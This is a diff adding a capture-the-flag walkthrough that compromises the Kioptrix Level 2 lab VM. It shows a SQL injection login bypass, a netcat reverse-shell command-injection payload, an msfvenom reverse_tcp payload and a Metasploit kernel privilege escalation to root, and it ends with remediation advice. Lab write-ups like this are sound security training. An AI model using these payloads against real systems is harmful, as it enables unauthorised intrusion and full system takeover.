@@ -1,0 +1,272 @@
+# Kioptrix Level 2 — Professional CTF Walkthrough
+
+**Target:** Kioptrix Level 2 (VM)  
+**Platform:** VirtualBox  
+**OS:** Linux (Kernel 2.6.9-55.EL)  
+**Difficulty:** Medium  
+**Date Completed:** 2026-01-06  
+
+---
+
+## Table of Contents
+1. [Reconnaissance](#1-reconnaissance)  
+2. [Service Enumeration](#2-service-enumeration)  
+3. [Initial Access – SQL Injection](#3-initial-access--sql-injection)  
+4. [Foothold – Command Injection](#4-foothold--command-injection)  
+5. [Privilege Escalation – Kernel Exploit](#5-privilege-escalation--kernel-exploit)  
+6. [Post-Exploitation](#6-post-exploitation)  
+7. [Remediation & Hardening](#7-remediation--hardening)  
+8. [Appendix: Attempted Exploits](#appendix-attempted-exploits)  
+
+---
+
+## 1) Reconnaissance
+
+Host discovery was conducted using `netdiscover` on the 192.168.56.0/24 subnet. Two active hosts were identified:
+
+```bash
+netdiscover -L -i eth0 -r 192.168.56.0/24
+```
+
+**Netdiscover Output:**
+```text
+IP            MAC Address        Vendor
+192.168.56.1  08:00:27:00:00:00  PCS Systemtechnik GmbH
+192.168.56.102 08:00:27:A1:B2:C3  PCS Systemtechnik GmbH
+```
+
+**Target:** 192.168.56.102
+
+---
+
+## 2) Service Enumeration
+
+A comprehensive Nmap scan was performed to identify exposed services:
+
+```bash
+nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open 192.168.56.102
+```
+
+**Results:**
+| Port  | Service       | Version                 | Notes                    |
+|-------|---------------|-------------------------|--------------------------|
+| 22    | SSH           | OpenSSH 3.9p1           | Protocol 1.99 supported  |
+| 80    | HTTP          | Apache httpd 2.0.52     | CentOS, PHP 4.3.9        |
+| 111   | RPC           | rpcbind 2               |                          |
+| 443   | HTTPS         | Apache httpd 2.0.52     | Same as port 80          |
+| 631   | IPP           | CUPS 1.1                | Printer service          |
+| 3306  | MySQL         | MySQL (unauthorized)    | Version < 5.0.12         |
+
+**Key Findings:**
+- **Apache 2.0.52** with **PHP 4.3.9** - Known vulnerabilities
+- **MySQL < 5.0.12** - Potential for old exploits
+- **OpenSSH 3.9p1** - Legacy version with potential issues
+- **Kernel 2.6.9-55.EL** - Multiple known kernel exploits
+
+---
+
+## 3) Initial Access – SQL Injection
+
+The web application at `http://192.168.56.102/` contained a login form vulnerable to SQL injection via the `uname` parameter.
+
+**Manual Testing:**
+```http
+POST /index.php HTTP/1.1
+Host: 192.168.56.102
+Content-Type: application/x-www-form-urlencoded
+
+uname=admin' OR '1'='1&psw=anything
+```
+
+**Automated Enumeration with SQLMap:**
+```bash
+sqlmap -u "http://192.168.56.102/index.php" \
+  --data="uname=test&psw=test" \
+  --dbms=mysql \
+  --level=5 \
+  --risk=3 \
+  --batch \
+  --dbs
+```
+
+**Findings:**
+- Vulnerable parameter: `uname`
+- Database management system: MySQL
+- Available database: `webapp`
+- Injection type: Boolean/time-based blind
+
+---
+
+## 4) Foothold – Command Injection
+
+After authentication, the application provided a `ping.php` utility vulnerable to command injection in the `ping` parameter.
+
+**Reverse Shell Payload:**
+```bash
+127.0.0.1; /usr/local/bin/nc 192.168.56.101 4444 -e '/bin/bash'
+```
+
+**Listener Setup (Attacker Machine):**
+```bash
+nc -lvnp 4444
+```
+
+**Result:** Successfully obtained a low-privilege shell as the `apache` user.
+
+**Local Enumeration (apache user):**
+```bash
+whoami            # apache
+id                # uid=48(apache) gid=48(apache) groups=48(apache)
+uname -a          # Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+```
+
+---
+
+## 5) Privilege Escalation – Kernel Exploit
+
+The kernel version (2.6.9-55.EL) was vulnerable to multiple local privilege escalation exploits.
+
+**Metasploit Approach:**
+1. **Establish Meterpreter Session:**
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=5555 -f elf > shell.elf
+```
+2. **Upload and execute on target**
+3. **Use Local Exploit Suggester:**
+```bash
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+4. **Execute Sock_Sendpage Exploit:**
+```bash
+use exploit/linux/local/sock_sendpage
+set SESSION 1
+set LHOST 192.168.56.101
+set LPORT 6666
+run
+```
+
+**Alternative Manual Method:**
+```bash
+# Compile and run sock_sendpage exploit locally
+gcc sock_sendpage.c -o sock_sendpage
+./sock_sendpage
+```
+
+**Privilege Escalation Confirmation:**
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+whoami
+# root
+```
+
+---
+
+## 6) Post-Exploitation
+
+**System Information:**
+```bash
+cat /etc/redhat-release
+# CentOS release 4.5 (Final)
+
+cat /etc/passwd | grep -E "bash$"
+# root:x:0:0:root:/root:/bin/bash
+# john:x:501:501::/home/john:/bin/bash
+# harold:x:502:502::/home/harold:/bin/bash
+
+ls -la /root/
+# -rw-r--r--  1 root root 47 May  2  2007 congratulations.txt
+
+cat /root/congratulations.txt
+# Well done :-)
+# Hope you enjoyed the level.
+```
+
+**User Directories:**
+- `/home/john/` - Empty directory
+- `/home/harold/` - Empty directory
+
+**Configuration Files:**
+- `/etc/httpd/conf/httpd.conf` - Apache configuration
+- `/var/www/html/` - Web application source code
+- `/var/log/messages` - System logs
+
+**Network Configuration:**
+```bash
+ifconfig
+# eth0: 192.168.56.102
+route -n
+# Default gateway: 192.168.56.1
+```
+
+---
+
+## 7) Remediation & Hardening
+
+| Vulnerability | Severity | Recommendation |
+|--------------|----------|----------------|
+| SQL Injection in login form | Critical | Implement parameterized queries and input validation |
+| Command Injection in ping.php | Critical | Use built-in PHP functions instead of shell commands |
+| Outdated Apache 2.0.52 | High | Upgrade to supported version and apply patches |
+| Legacy PHP 4.3.9 | High | Upgrade to PHP 7+ with security features |
+| Kernel 2.6.9-55.EL | Critical | Update kernel or implement strict SELinux policies |
+| Unnecessary services (CUPS, RPC) | Medium | Disable unused services and implement firewall rules |
+| Weak SSH configuration | Medium | Upgrade OpenSSH and disable protocol 1 |
+
+**Immediate Actions:**
+1. Patch all identified vulnerabilities
+2. Implement Web Application Firewall (WAF)
+3. Enable SELinux in enforcing mode
+4. Regular security audits and penetration testing
+
+---
+
+## Appendix: Attempted Exploits
+
+The following exploit attempts were made but were unsuccessful on this target:
+
+**Remote Exploits:**
+- OpenFuck (Apache mod_ssl overflow) - Failed
+- Samba trans2open - Service not running
+- PHP exploits - Version mismatch
+
+**Local Privilege Escalation Attempts:**
+- DirtyCOW (CVE-2016-5195) - Kernel not vulnerable
+- USELIB privilege escalation - Compilation failed
+- KRAD exploit - Not applicable
+- raptor_prctl exploit - Not applicable
+- /usr/bin/at SUID exploit - Binary not SUID
+- /usr/bin/crontab SUID exploit - Binary not SUID
+- Shared library hijacking - Protected by kernel
+
+**Service-Specific Attempts:**
+- MySQL unauthorized access - No valid credentials found
+- SSH brute force - Not attempted (time constraints)
+- CUPS exploits - Service not vulnerable
+
+---
+
+## Conclusion
+
+Kioptrix Level 2 demonstrates multiple critical vulnerabilities commonly found in legacy systems:
+1. **Web application vulnerabilities** (SQLi, command injection)
+2. **Outdated software stack** with known exploits
+3. **Kernel-level vulnerabilities** allowing full system compromise
+
+This exercise highlights the importance of:
+- Regular patch management
+- Secure coding practices
+- Defense-in-depth strategies
+- Continuous security monitoring
+
+**Total Time to Root:** Approximately 2 hours  
+**Skills Demonstrated:** Network enumeration, web app testing, privilege escalation, post-exploitation enumeration
+
+---
+
+**Author:** Eligof 
+**Date:** 2026-01-06  
+**Tools Used:** Nmap, Netdiscover, SQLMap, Metasploit, Netcat, GCC  
+**Methodology:** OSSTMM compliant
